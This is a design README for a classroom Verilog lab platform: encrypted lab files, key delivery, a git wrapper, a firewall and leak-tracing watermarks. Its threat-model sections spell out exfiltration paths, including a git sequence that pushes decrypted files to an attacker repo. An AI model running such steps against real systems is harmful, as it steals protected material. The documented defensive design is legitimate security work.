# ChipCraft Lab — How It Works

## Overview

ChipCraft is a browser-based VLSI lab platform. Students log in with GitHub, get a
private Linux desktop (XFCE + VNC) in their browser, and work with Verilog files
using Verilator, iverilog, and GTKWave — without installing anything locally.

The Verilog lab files are **encrypted at rest**. Students edit them in gvim, which
decrypts straight into the editor buffer and never writes a plaintext `.v` file to
disk — so `docker cp`, the terminal, or any other generic copy command only ever
finds ciphertext. Compiling is the one exception: `iverilog` is a separate process
that needs a real file, so `make` decrypts just-in-time and shreds the plaintext
the moment the compile step finishes — exposure measured in seconds, not the whole
session.

The encryption key is delivered via a **Cloudflare Worker** — it never appears as
an environment variable in the container, so `docker inspect` reveals nothing useful.

---

## GitHub Repositories

| Repo | URL | Purpose |
|---|---|---|
| `chipcraft-lab` | github.com/narrave/chipcraft-lab | Infrastructure — Dockerfile, API, entrypoint, tools |
| `chipcraft-lab-files` | github.com/narrave/chipcraft-lab-files | Lab files — encrypted `.v.enc` files + Makefile |
| `chipcraft-student` | github.com/narrave/chipcraft-student | VS Code Codespace launch only (devcontainer) |

> **`chipcraft-lab-files` is public** (files are encrypted so sharing them is safe).
> The API forks it into each student account on login (Server Mode).
> In Codespace/Docker Mode, students clone it directly.

---

## System Architecture

```
+--------------------------------------------------------------------------+
|  TEACHER'S PC                                                            |
|                                                                          |
|  counter.v  --encrypt-->  counter.v.enc  --push-->  chipcraft-lab-files |
|  (private)    encrypt_lab.sh   (safe to share)      github.com/narrave   |
+--------------------------------------------------------------------------+
                                                              |
                                              Cloned into ~/lab/ per student
                                                              |
+--------------------------------------------------------------------------+
|  SERVER  (docker compose up)                                             |
|                                                                          |
|  +------------------+        +---------------------------------------+   |
|  |  API Service     |        |  Student Container (one per student)  |   |
|  |  port 80         |        |                                       |   |
|  |                  |        |  ~/lab/            (git repo)         |   |
|  |  CHIPCRAFT_KEY   |<------>|    counter.v.enc   <- re-encrypted    |   |
|  |  in memory only  |one-time|    tb_counter.v.enc                   |   |
|  |                  | token  |    Makefile                           |   |
|  |  GitHub OAuth    |        |    mywork/         <- student .v files|   |
|  +------------------+        |                                       |   |
|                               |  ~/.chipcraft_key  (mode 600)         |   |
|                               |  gvim decrypts *.v.enc in memory      |   |
|                               |  (no plaintext .v file written)       |   |
|                               |                                       |   |
|                               |  ~/lab/.build/  (tmpfs — `make` only, |   |
|                               |    used briefly, shredded right       |   |
|                               |    after iverilog compiles)           |   |
|                               |  Browser VNC desktop (noVNC 6080)    |   |
|                               +---------------------------------------+   |
+--------------------------------------------------------------------------+
                                       |
                                 Student's browser
                          (sees XFCE desktop via noVNC)
```

---

## Components

| File / Service | Repo | Role |
|---|---|---|
| `tools/encrypt_lab.sh` | chipcraft-lab | Teacher encrypts `.v` files on their PC |
| `tools/chipcraft-key-init.sh` | chipcraft-lab | Container — fetches the key once, writes `~/.chipcraft_key` (mode 600) |
| `tools/chipcraft-tree.sh` | chipcraft-lab | Container — decrypts/shreds a whole subtree (for multi-file Perl/bash build flows like `tarang2_dp1`) |
| `tools/chipcraft-sweep.sh` | chipcraft-lab | Container — background watcher; auto-encrypts any stray plaintext that appears under `~/lab` by any means other than gvim (`cp`, `mv`, `docker cp`, …) |
| `tools/chipcraft-crypt.vim` | chipcraft-lab | System-wide gvim plugin — decrypts/encrypts `*.v.enc` in memory, no plaintext file ever written |
| `tools/watermark.py` | chipcraft-lab | Embeds / reads invisible trailing-space watermark |
| `tools/detect_leak.sh` | chipcraft-lab | Teacher tool — identifies student from a leaked file |
| `tools/git-wrapper.sh` | chipcraft-lab | Installed as `/usr/local/bin/git` — blocks git outside `~/lab/` |
| `api/main.py` | chipcraft-lab | FastAPI — GitHub OAuth, container launch, key delivery |
| `router/app.py` | chipcraft-lab | Load balancer across student containers |
| `Dockerfile` | chipcraft-lab | Builds student desktop image (XFCE + VNC + Verilator) |
| `entrypoint.sh` | chipcraft-lab | Container startup — VNC, firewall, key fetch |
| `docker-compose.yml` | chipcraft-lab | Defines API service and build targets |
| `.env` | server only | Server-side secrets — never committed |
| `*.v.enc` | chipcraft-lab-files | Encrypted Verilog lab files |
| `mywork/` | chipcraft-lab-files | Student-created work (only `.v.enc` files — auto-encrypted on save) |
| `Makefile` | chipcraft-lab-files | `make` / `make wave` / `make clean` |
| `.gitignore` | chipcraft-lab-files | Blocks everything; only `*.enc` and repo infra files allowed |
| `.devcontainer/setup.sh` | chipcraft-student | Codespace startup — clones lab, fetches key, starts decrypt, registers pre-commit hook |
| `.devcontainer/devcontainer.json` | chipcraft-student | Codespace config — image, ports, postAttachCommand |
| `tools/pre-commit` | chipcraft-lab (image) | Git hook baked into Docker image at `/usr/local/lib/chipcraft-hooks/` — root-owned, students cannot edit |

---

## Deployment Options

Three ways to run ChipCraft. Choose based on your needs:

| | Codespace Mode | Local Docker Mode | Server Mode |
|---|---|---|---|
| **What runs where** | Student's own Codespace | Student's own laptop/PC | VPS / cloud server |
| **Cost** | Free (GitHub Codespaces) | Free (Docker Desktop) | ~$4-6/month |
| **Key hidden from students?** | Yes — via Cloudflare Worker | Yes — key only in Cloudflare | Yes — never in student env |
| **Setup time** | 10 minutes | 10 minutes | 30 minutes |
| **Best for** | Quick classes, no local installs | Small groups, offline use | Real lab, best security |
| **Requires internet** | Yes | Only to pull image and fetch key | Yes |

---

## Encryption — Teacher Side

### The Key

The encryption key is an AES-256 passphrase set by the teacher.
It lives in **two places only**:

1. The teacher's terminal (`CHIPCRAFT_KEY` env var) when encrypting
2. Cloudflare Worker secrets (delivers key at runtime, hidden from all students)

It is **never** stored in:
- The Docker image
- Any GitHub repository
- The student container's environment

### Encrypting Files

```bash
# On teacher's PC (Git Bash / WSL / Mac / Linux)
export CHIPCRAFT_KEY="your-secret-key"

# Encrypt a single file
bash NVR/tools/encrypt_lab.sh counter.v
# -> counter.v.enc

# Encrypt all .v files in a folder at once
bash NVR/tools/encrypt_lab.sh labs/
```

`encrypt_lab.sh` uses **AES-256-CBC with PBKDF2** (openssl):

```
openssl enc -aes-256-cbc -pbkdf2 -salt -k "$KEY" -in counter.v -out counter.v.enc
```

### Pushing Encrypted Files to chipcraft-lab-files

Only encrypted files go to GitHub. The `.gitignore` blocks everything except `.enc` files:

```
*            <- block everything by default
!.gitignore  <- allow repo infrastructure
!Makefile
!*.enc       <- the only data files allowed are encrypted Verilog
```

```bash
cd chipcraft-lab-files
cp ../labs/*.v.enc .
git add *.v.enc
git commit -m "lab1: counter"
git push
```

---

## Key Delivery — How the Container Gets the Key

The key is delivered via one of four methods, tried in order:

```
Priority 1 — Server Mode (API bootstrap token)
  Container calls  POST http://api:8000/lab-key  with BOOTSTRAP_TOKEN
  API validates the one-time token and returns CHIPCRAFT_KEY

Priority 2 — Codespace / Local Docker (Cloudflare Worker)
  setup.sh or chipcraft-key-init.sh sends CLASS_TOKEN to Cloudflare Worker
  Worker validates CLASS_TOKEN and returns CHIPCRAFT_KEY
  CHIPCRAFT_KEY is never stored in any environment variable —
  chipcraft-key-init.sh writes it straight to ~/.chipcraft_key (mode 600)

Priority 3 — Codespace fallback (CHIPCRAFT_KEY direct env var)
  If CHIPCRAFT_KEY is set as a Codespace secret, chipcraft-key-init.sh reads it

Priority 4 — Development / testing (LAB_KEY env var)
  If LAB_KEY is set locally, use it for local testing
```

---

## Cloudflare Worker — Hiding the Key

In **Codespace Mode** and **Local Docker Mode**, the key is delivered via a
free **Cloudflare Worker** instead of a local API server.

### Why it is needed

In Local Docker Mode, anyone can run `docker inspect <container>` and see all
environment variables — including secrets passed with `-e`. The Cloudflare
Worker prevents this by keeping `CHIPCRAFT_KEY` out of the container entirely.

### How it works

```
Teacher sets two secrets in Cloudflare dashboard:
  CLASS_TOKEN   = vlsi2026    <- shared with students (door pass, not the key)
  CHIPCRAFT_KEY = your-key    <- never shared (real encryption key)

Student container has CLASS_TOKEN in its environment:
  (visible in docker inspect, but harmless — it is just a door pass)

When chipcraft-key-init.sh needs the key:
  POST https://chipcraft-key.nagajyothibonthagorla.workers.dev
  Body: { "class_token": "vlsi2026", "user": "student_github_name" }

Worker checks CLASS_TOKEN:
  Match    -> returns { "key": "your-key" }
  No match -> returns 401 Unauthorized

CHIPCRAFT_KEY never leaves Cloudflare.
Students can only ever see CLASS_TOKEN (the door pass, not the vault).
```

### Cloudflare Worker code

```javascript
export default {
  async fetch(request, env) {
    if (request.method !== "POST") return new Response("Not allowed", { status: 405 });
    let body;
    try { body = await request.json(); }
    catch { return new Response("Bad request", { status: 400 }); }
    const { class_token, user } = body;
    if (!class_token || class_token !== env.CLASS_TOKEN)
      return new Response("Unauthorized", { status: 401 });
    console.log(`Key issued to: ${user}`);
    return Response.json({ key: env.CHIPCRAFT_KEY });
  }
};
```

### Setting up the Worker (teacher does once)

```
1. Go to cloudflare.com -> Workers & Pages -> Create application
2. Choose "Start with Hello World" -> name it chipcraft-key -> Deploy
3. Open the worker -> Edit code -> paste the code above -> Deploy
4. Go to Settings -> Variables and Secrets -> Add:
     CLASS_TOKEN   = vlsi2026        (give this to students)
     CHIPCRAFT_KEY = your-key        (keep this to yourself)
5. Update WORKER_URL in:
     NVR/tools/chipcraft-key-init.sh
     chipcraft-student/.devcontainer/setup.sh
```

---

## Server Mode — Key Delivery Step by Step

```
1. Teacher sets CHIPCRAFT_KEY in .env on server

2. docker compose up  ->  API container reads CHIPCRAFT_KEY into memory

3. Student logs in via GitHub OAuth

4. API forks chipcraft-lab-files -> student GitHub account
   API clones student fork       -> ~/lab/ inside the container

5. API generates BOOTSTRAP_TOKEN (32 random bytes, expires in 30 seconds)
   API launches student container with BOOTSTRAP_TOKEN only
   (CHIPCRAFT_KEY is NOT passed to the student container)

6. Container starts -> chipcraft-key-init.sh runs

7. chipcraft-key-init.sh calls:
   POST http://api:8000/lab-key  { "token": "<BOOTSTRAP_TOKEN>" }
   (over internal Docker network — not reachable from student browser)

8. API validates: IP check + not expired + single-use

9. API returns CHIPCRAFT_KEY; chipcraft-key-init.sh writes it to
   ~/.chipcraft_key (mode 600, owned by ubuntu); BOOTSTRAP_TOKEN immediately
   unset from environment

10. Student opens ~/lab/counter.v.enc in gvim. The chipcraft-crypt.vim plugin
    reads ~/.chipcraft_key, pipes the buffer through openssl, embeds the
    invisible watermark — all inside the editor buffer. No plaintext .v file
    is written to disk.

11. Student edits in gvim; `:w` pipes the buffer back through openssl and
    overwrites ~/lab/counter.v.enc directly.
```

### Why students cannot steal the key

| Attack | Blocked because |
|---|---|
| `env` in terminal | BOOTSTRAP_TOKEN already consumed and unset; CHIPCRAFT_KEY was never there |
| `curl http://api:8000/lab-key` | Token already used — returns 401 |
| Copy `.v.enc` file and decrypt | They do not have the key |
| Read `.env` file | On the server — not inside the container |
| `docker inspect api` | Requires Docker daemon access — students do not have it |
| `cat ~/.chipcraft_key` | **Not blocked** — same Linux user as gvim, so the key is readable by design. The point of this file is keeping the key off `env`/`docker inspect`, not hiding it from the student's own shell — that's structurally impossible once the same user must decrypt their own files. |

---

## Decryption — Inside the Container

There are two separate decrypt paths now: **editing** (gvim, always in-memory)
and **compiling** (`make`, which needs a real file for `iverilog` to read).

### Editing — gvim, in memory, no plaintext file ever

`chipcraft-key-init.sh` runs once at container startup and writes the key to
`~/.chipcraft_key` (mode 600). The `chipcraft-crypt.vim` plugin (loaded
system-wide for every user) hooks `*.v.enc` files:

```
Student runs:  gvim ~/lab/counter.v.enc
         |
         |  BufReadCmd fires — plugin reads ~/.chipcraft_key
         |  openssl enc -d -k "$KEY"   (piped straight into the buffer)
         |  watermark.py encode "@github_user"
         v
Plaintext exists only inside gvim's buffer.
swapfile / backup / undofile are disabled for this buffer — Vim itself
never spills it to disk either.

Student edits, then :w
         |
         |  BufWriteCmd fires — buffer piped through openssl
         v
~/lab/counter.v.enc   (overwritten directly — no intermediate plaintext file)
```

New designs work the same way — `gvim ~/lab/mywork/my_adder.v.enc` on a
filename that doesn't exist yet creates it; `:w` encrypts straight to that path.

### Compiling — decrypt just-in-time, shred immediately

`iverilog`/`vvp`/`gtkwave` are separate processes; they can only read real
files. `make` (in `chipcraft-lab-files/Makefile`) bridges this gap with the
smallest possible exposure window:

```
make / make wave / make run FILE=counter
         |
         |  _decrypt: openssl enc -d -k "$(cat ~/.chipcraft_key)"
         v
~/lab/.build/*.v   (tmpfs — exists only for the few seconds iverilog runs)
         |
         |  iverilog -o sim.vvp *.v
         v
~/lab/.build/sim.vvp   (compiled bytecode — kept)
         |
         |  _shred: shred -u ~/lab/.build/*.v   (runs even if compile failed)
         v
~/lab/.build/*.v no longer exists — only the compiled .vvp and any .vcd remain
```

### Multi-file projects — chipcraft-tree (e.g. tarang2_dp1)

Some lab content isn't a single-file `make` away from compiling — `tarang2_dp1`
is a full 8051-style CPU core with its own Perl/bash-driven build and
regression scripts (`compile.pl`, `regress.pl`, `bash_proj`, …), which are
themselves encrypted and need a whole subtree of real files, at their real
relative paths, coexisting on disk at once. Neither gvim (one file, in
memory) nor the `Makefile` (one flattened batch, for `iverilog`) covers that.
`chipcraft-tree` decrypts/shreds an entire subtree instead:

```bash
chipcraft-tree shell tarang2_dp1   # decrypts ~/lab/tarang2_dp1 -> ~/lab/.build/tarang2_dp1
                                    # (preserving directory structure) and drops you into
                                    # a subshell already cd'd into it

cd tarang/verilator/
bash ../scripts/bash_proj
perl ../scripts/compile.pl
perl ../scripts/regress.pl -r

exit                                # auto-shreds the whole decrypted tree on the way out
```

`shell` is the recommended form — it decrypts, then registers a `trap ... EXIT`
that shreds automatically when you exit the subshell (whether by `exit`,
Ctrl-D, or most signals), so there's no separate step to forget. A `start`
(decrypt only) / `stop` (shred only) pair also exists for scripted,
non-interactive use, but a forgotten `stop` after `start` leaves real
plaintext sitting on disk for however long the rest of the session runs —
prefer `shell` unless you have a specific scripted reason not to.

Honest tradeoff either way: a `make` compile shreds plaintext after a few
seconds; a `chipcraft-tree` session stays decrypted for as long as the
subshell is open — a regression run can take minutes. Still far better than
the old model (decrypt everything, leave it for the entire container
lifetime), and the one true limit — a `kill -9` on the subshell can't be
trapped by any process — is a kernel-level constraint, not specific to this
tool.

### Catching stray plaintext from cp / mv / docker cp

`chipcraft-crypt.vim` only intercepts Vim's own buffer I/O — it can't see a
file written by any other tool. If a student runs `cp myfile.v ~/lab/` (or
`docker cp` copies a plaintext file in from outside), that file just exists,
unencrypted, with nothing to stop it.

`chipcraft-sweep.sh` runs two layers in the background for exactly this gap:
an `inotifywait` event watch for fast response, plus a full-tree poll every 5
seconds as a backstop. The poll exists because recursive inotify watches
have a real race — if something like `cp -r` creates a brand-new directory
and immediately floods it with files, the watch on that new directory may
not be registered yet when those writes happen, and the events are lost
entirely (a known inotify limitation, observed in practice with `cp -r`
copying a whole directory tree out of `.build/`). The poll can't miss
anything for longer than 5 seconds, regardless of how fast files land.

Either layer: any file under `~/lab` that isn't `*.enc`, isn't under
`~/lab/.build/` (tmpfs build scratch) or `~/lab/.git/` (git's own internals —
touching these would corrupt the repo), and isn't one of the allowed
plaintext infra files (`Makefile`, `.gitignore`, `.gitattributes`, `README.md`)
gets moved out of the watched tree, encrypted to its `.enc` counterpart, and
shredded — automatically, regardless of how it got there.

Same residual limit as everywhere else in this system: there's an
unavoidable race between "file appears" and either layer reacting. A
`docker cp` reading the file in that exact instant can't be prevented by
anything running inside the container — that's a kernel-level limit, not
something this script (or any script) can close to zero.

### tmpfs — why it still matters

`/home/ubuntu/lab/.build` is still a **RAM-only filesystem** (tmpfs, 2 GB ceiling — sized for Verilator builds, not just iverilog), nested
inside `~/lab` rather than a sibling folder — one directory for students to
think about, not two confusingly-similar names. Its role has shrunk: it now
only ever holds plaintext `.v` source for the duration
of one `make` invocation, not for the whole session. Compiled `.vvp`/`.vcd`
output (not readable source) is what persists there between builds.

### Which files get re-encrypted on save

Every `:w` in gvim re-encrypts. Teacher files update their existing `.enc` in
`~/lab/`; student-created new files are saved directly to `~/lab/mywork/`.

| File opened in gvim | `~/lab/*.v.enc` exists? | `:w` writes to |
|---|---|---|
| `~/lab/counter.v.enc` (teacher lab file) | Yes | `~/lab/counter.v.enc` |
| `~/lab/tb_counter.v.enc` (teacher lab file) | Yes | `~/lab/tb_counter.v.enc` |
| `~/lab/mywork/my_adder.v.enc` (student new file) | No | `~/lab/mywork/my_adder.v.enc` (created) |
| `~/lab/mywork/seq_circuit.v.enc` (student new file) | No | `~/lab/mywork/seq_circuit.v.enc` (created) |

---

## Git Wrapper — Security Restriction

The Docker image installs a **git wrapper at `/usr/local/bin/git`** that sits in
front of the real git binary. This prevents students from pushing decrypted files
outside the lab repository.

### What the wrapper blocks

| Command | From where | Result |
|---|---|---|
| `git init` | Anywhere | Blocked — `[ChipCraft] git init is not allowed in this lab.` |
| `git clone` | Anywhere | Blocked — `[ChipCraft] git clone is not allowed in this lab.` |
| `git add` / `git commit` / `git push` | Outside `~/lab/` | Blocked — `[ChipCraft] git is only allowed inside ~/lab/.` |
| `git add counter.v` (plain `.v`) | Inside `~/lab/` | Silently ignored by `.gitignore` |
| `git add -f counter.v` then `git commit` | Inside `~/lab/` | Blocked by pre-commit hook (baked in image, read-only) — `COMMIT BLOCKED: only .enc files may be added` |
| `git add counter.v.enc` | Inside `~/lab/` | Allowed — encrypted file |
| `git commit` / `git push` with only `.enc` files | Inside `~/lab/` | Allowed — normal workflow |
| All other commands (log, diff, status…) | Anywhere | Allowed |

### Without the wrapper, a student could

```bash
cd ~/lab/.build              # decrypted files briefly live here during `make`
                              # (git wrapper's "outside ~/lab" check doesn't help here —
                              #  .gitignore + the pre-commit hook are what actually block this)
git init                    # creates a new repo
git add counter.v           # stages the decrypted file
git commit -m "stolen"
git push <attacker_repo>    # sends plaintext to their personal repo
```

With the wrapper, `git init` exits immediately with an error.

### Pre-commit hook — not editable by students

`setup.sh` registers `~/lab` to use the hook baked into the image:

```bash
/usr/bin/git -C "$HOME/lab" config core.hooksPath /usr/local/lib/chipcraft-hooks
```

The hook file is at `/usr/local/lib/chipcraft-hooks/pre-commit` — owned by root,
not writable by the `ubuntu` user. Students cannot modify or delete it.

### Internal tools bypass the wrapper

`setup.sh` and `chipcraft-key-init.sh` call `/usr/bin/git` directly (not the wrapper)
so that automated cloning and pushing of encrypted files works correctly.

---

## Student Workflow

### Codespace Mode

```
1. Teacher gives you CLASS_TOKEN (e.g. vlsi2026)
2. Open github.com/narrave/chipcraft-student
3. Click Code -> Open in Codespace
4. Wait ~2 minutes for the container to start
5. The XFCE desktop opens automatically in your browser (port 6080)
6. Open terminal -> cd ~/lab && gvim counter.v.enc   (edits in place, in memory)
7. To compile/simulate: cd ~/lab && make
```

How setup.sh works when you attach:

```
postAttachCommand fires (runs AFTER Codespace secrets are injected):
  |
  +-- git clone chipcraft-lab-files -> ~/lab/
  |
  +-- Runs chipcraft-key-init.sh:
  |     -> Sends CLASS_TOKEN to Cloudflare Worker
  |     -> Worker validates CLASS_TOKEN, returns CHIPCRAFT_KEY
  |     -> Writes key to ~/.chipcraft_key (mode 600) — not kept in env
  |
  +-- gvim now decrypts/encrypts *.v.enc files transparently, in memory
```

> **postAttachCommand** is used (not postStartCommand) because Codespace secrets
> are only available after the user attaches, not during container start.

### Local Docker Mode

```bash
docker pull ghcr.io/narrave/chipcraft:latest
docker run -d \
  -p 6080:6080 \
  -e CLASS_TOKEN=vlsi2026 \
  -e GITHUB_USER=your_github_name \
  --tmpfs /home/ubuntu/lab/.build:size=2g,uid=1000,gid=1000,mode=0700 \
  ghcr.io/narrave/chipcraft:latest
# Open http://localhost:6080 in your browser
```

2g, not 100m: `chipcraft-tree`'s Verilator builds (precompiled headers, object
files for a full RTL project) need much more scratch space than a single
`iverilog` compile of one file ever did. tmpfs is a ceiling, not a
reservation — it only consumes RAM as data is actually written.

The `--tmpfs` flag is required — without it, `~/lab/.build` (used briefly during
`make` to hold plaintext just long enough for `iverilog` to compile) would
be a normal directory on the container's writable disk layer instead of
RAM-only, the same way it already is in Server Mode.

`entrypoint.sh` clones `chipcraft-lab-files` into `~/lab` automatically on
first start (only when `BOOTSTRAP_TOKEN` isn't set, i.e. not Server Mode) —
no manual clone step needed. `CLASS_TOKEN` is already present at container
start (passed via `-e`), so the key fetch succeeds immediately, unlike
Codespace Mode where it has to wait for `postAttachCommand`.

The container fetches the key from the Cloudflare Worker using CLASS_TOKEN.

### Edit (all modes)

```bash
cd ~/lab
gvim counter.v.enc      # decrypts into the buffer, watermarked, in memory
:w                       # re-encrypts straight back to counter.v.enc
```

### Compile and simulate (all modes)

```bash
cd ~/lab                 # or chipcraft-lab-files checkout
make              # decrypts to tmpfs just-in-time, compiles, shreds plaintext immediately
make wave         # same, + opens GTKWave
make clean        # remove build outputs (compiled .vvp/.vcd only)
```

### Save lab work to GitHub

```bash
cd ~/lab
git add *.v.enc
git commit -m "lab1 solution"
git push
```

### Save your own files (mywork/)

```bash
# Create and edit a new design directly as an encrypted file
cd ~/lab/mywork
gvim my_adder.v.enc     # new filename — :w creates it, encrypted, in mywork/

# Commit the encrypted version to GitHub
cd ~/lab
git add mywork/my_adder.v.enc
git commit -m "my adder design"
git push
```

Student-created files live directly in `~/lab/mywork/*.v.enc` — there's no
intermediate plaintext copy to auto-encrypt, since gvim never created one.
Only `.enc` files can be committed — the pre-commit hook blocks any plain `.v` or other file type.
The hook lives in the Docker image at `/usr/local/lib/chipcraft-hooks/pre-commit` (root-owned) so students cannot edit or delete it.

---

## Server Setup (Teacher)

### 1. Create `.env` on the server

```bash
# NVR/.env   (never commit this file)
CHIPCRAFT_KEY=your-secret-key-here
GH_CLIENT_ID=your_github_oauth_app_id
GH_CLIENT_SECRET=your_github_oauth_secret
VNC_PASSWORD=novnc
TEMPLATE_REPO=narrave/chipcraft-lab-files
SESSION_TTL=14400
PORT_START=6081
PORT_END=6180
```

### 2. Get the Docker image (GitHub Actions builds it automatically)

Every push to `master` that touches `Dockerfile`, `entrypoint.sh`,
`tools/chipcraft-key-init.sh`, or `tools/chipcraft-crypt.vim` triggers **GitHub Actions -> Publish Docker Image**
which builds and pushes `ghcr.io/narrave/chipcraft:latest` automatically.

```bash
docker pull ghcr.io/narrave/chipcraft:latest
docker tag ghcr.io/narrave/chipcraft:latest ubuntu-novnc:latest
cd NVR
docker compose up -d
```

To roll out a new image after a code push:

```bash
docker pull ghcr.io/narrave/chipcraft:latest
docker tag  ghcr.io/narrave/chipcraft:latest ubuntu-novnc:latest
# New student containers will use the updated image automatically.
```

### 3. Encrypt and push lab files

```bash
export CHIPCRAFT_KEY="your-secret-key-here"
bash NVR/tools/encrypt_lab.sh counter.v
bash NVR/tools/encrypt_lab.sh tb_counter.v

cd chipcraft-lab-files
cp ../counter.v.enc ../tb_counter.v.enc .
git add *.v.enc
git commit -m "lab1: counter"
git push
```

---

## Codespace Setup (Teacher)

```bash
# 1. Deploy Cloudflare Worker (see Cloudflare section above)
#    Set CLASS_TOKEN and CHIPCRAFT_KEY as Worker secrets

# 2. Set Codespace secret  (CLASS_TOKEN only — NOT CHIPCRAFT_KEY)
#    github.com/settings/codespaces -> New secret
#    Name: CLASS_TOKEN  Value: vlsi2026  Repo: chipcraft-student

# 3. Encrypt lab files
export CHIPCRAFT_KEY="your-key"
bash NVR/tools/encrypt_lab.sh counter.v
cp counter.v.enc chipcraft-lab-files/
cd chipcraft-lab-files && git add *.v.enc && git commit -m "lab1" && git push

# 4. Make chipcraft-lab-files PUBLIC
#    github.com/narrave/chipcraft-lab-files -> Settings -> Change visibility -> Public

# 5. Invite students to chipcraft-student as collaborators
#    github.com/narrave/chipcraft-student -> Settings -> Collaborators
```

---

## File Layout Inside the Container

```
/home/ubuntu/
|
+-- lab/                        <- git repo (persistent)
|   +-- counter.v.enc           <- re-encrypted by gvim on every :w
|   +-- tb_counter.v.enc
|   +-- Makefile
|   +-- .gitignore              <- blocks all files; only *.enc allowed
|   +-- mywork/                 <- student's own designs
|   |   +-- my_adder.v.enc      <- only .enc files here, committed to git
|   |
|   +-- .build/                 <- tmpfs (RAM only — vanishes when container stops)
|       +-- sim.vvp             <- generated by iverilog (compiled bytecode, kept)
|       +-- counter.vcd         <- generated by simulation, opened in GTKWave
|       (counter.v / tb_counter.v exist here only for the few seconds `make`
|        takes to compile — shredded immediately after iverilog exits)
|
+-- .chipcraft_key              <- decryption key, mode 600 (read by gvim plugin)
```

Plaintext `.v` source is never written to `~/lab/.build/` for editing anymore —
that only happens transiently during `make`. Editing happens entirely inside gvim's
buffer; see the Decryption section above.

---

## File Exfiltration — Possible Attack Paths

| Attack method | Blocked? | How |
|---|---|---|
| **noVNC clipboard** copy | Blocked | `-noclipboard` on Xvnc server |
| **git push decrypted files** from `~/lab/.build/` | Blocked | `.build/` is inside `~/lab` so the wrapper's "outside ~/lab" check doesn't apply here — instead `.gitignore` silently ignores plain `.v` files, and the pre-commit hook blocks any non-`.enc` add even with `-f` |
| **git init** anywhere | Blocked | git wrapper blocks `git init` everywhere |
| **git clone** to push to a private repo | Blocked | git wrapper blocks `git clone` everywhere |
| **curl / wget** to paste sites | Blocked | Egress firewall — only GitHub IPs allowed |
| **Browser inside VNC** to Google Drive, email | Blocked | Egress firewall |
| **`docker inspect`** to see CHIPCRAFT_KEY | Not possible | Key delivered via Cloudflare Worker — never an env var in the container |
| **`echo $CLASS_TOKEN`** | Visible | CLASS_TOKEN is a door pass, not the key — harmless |
| **`docker cp ~/lab/*.enc`** | Blocked | Ciphertext only — useless without the key |
| **`docker cp ~/lab/.build/*.v`** | Blocked (almost always) | No plaintext `.v` file exists there except for the few seconds a `make` is actively compiling |
| **`cp`/`mv`/`docker cp` dropping plaintext into `~/lab`** | Blocked (almost always) | `chipcraft-sweep.sh` auto-encrypts and shreds any stray plaintext within moments of it appearing, regardless of how it got there — but can't beat a read happening in the exact same instant |
| **`cat ~/.chipcraft_key`** | Not possible to block | Same Linux user as gvim — see note in the key-delivery table above |
| **Phone photo / screen recording** | Cannot block | Watermark identifies the student |
| **Manual typing** the code | Cannot block | Watermark + academic integrity policy |

---

## Watermarking — Tracing Leaked Files

Every decrypted `.v` file receives two watermarks automatically.
The student's GitHub username (from `GITHUB_USER` env var) is embedded uniquely
per container — no manual step needed.

### Visible watermark (decoy)

```verilog
// [ChipCraft] Student: @john_student | 2026-06-19
module counter #( ...
```

### Invisible watermark (real trap)

The student's GitHub username is encoded as **binary bits into trailing spaces**
on each line — completely invisible to readers and most editors. When the student
deletes the visible comment, the invisible watermark is still present.

### How to detect a leaked file (teacher tool)

```bash
export CHIPCRAFT_KEY="your-secret-key"

bash NVR/tools/detect_leak.sh leaked_counter.v
# -> Leaked file : leaked_counter.v
# -> Student     : @john_student

bash NVR/tools/detect_leak.sh counter.v.enc    # auto-decrypts first
```

---

## Egress Firewall

Each student container starts with iptables rules blocking all outbound traffic:

```
ALLOWED outbound:
  +-- Loopback (127.0.0.1)
  +-- Docker internal network (172.x, 10.x)   <- API key delivery (Server Mode)
  +-- DNS (port 53)
  +-- GitHub IP ranges (port 443 / 22)        <- git push only

BLOCKED outbound:
  +-- Everything else — paste sites, email, file sharing, cloud storage
```

---

## Security Summary

```
CHIPCRAFT_KEY journey (Codespace / Local Docker):
  Cloudflare Worker secrets (teacher access only)
    -> POST /worker (CLASS_TOKEN validated, CHIPCRAFT_KEY returned in response)
      -> bash variable in chipcraft-key-init.sh (~2 seconds)
        -> written to ~/.chipcraft_key (mode 600)  ->  read by gvim plugin per file

CHIPCRAFT_KEY journey (Server Mode):
  .env (server — teacher access only)
    -> API memory
      -> POST /lab-key (internal network, one-time token, 30s TTL)
        -> bash variable in chipcraft-key-init.sh
          -> written to ~/.chipcraft_key (mode 600)  ->  read by gvim plugin per file

CLASS_TOKEN (Codespace / Local Docker):
  Visible in student environment.
  It is a door pass, not the encryption key.
  Students can see it but cannot use it to obtain CHIPCRAFT_KEY directly.
  The Cloudflare Worker validates it but never exposes the key elsewhere.

Decrypted .v content while editing:
  Exists only inside gvim's buffer (openssl pipe in, openssl pipe out on :w)
  No plaintext file written, ever  ->  swapfile/backup/undofile disabled too

Decrypted .v files while compiling:
  ~/lab/.build/ (tmpfs, RAM only)  ->  exists only for the duration of one `make`
  call  ->  shredded the moment iverilog exits, success or failure

Encrypted .v.enc files:
  chipcraft-lab-files repo + ~/lab/ volume  ->  safe anywhere  ->  useless without key

Git operations:
  /usr/local/bin/git (wrapper) blocks init/clone everywhere
  and blocks add/commit/push outside ~/lab/
  Internal tools use /usr/bin/git directly — unaffected

If a file leaks:
  detect_leak.sh  ->  reads invisible trailing-space watermark  ->  names the student
```
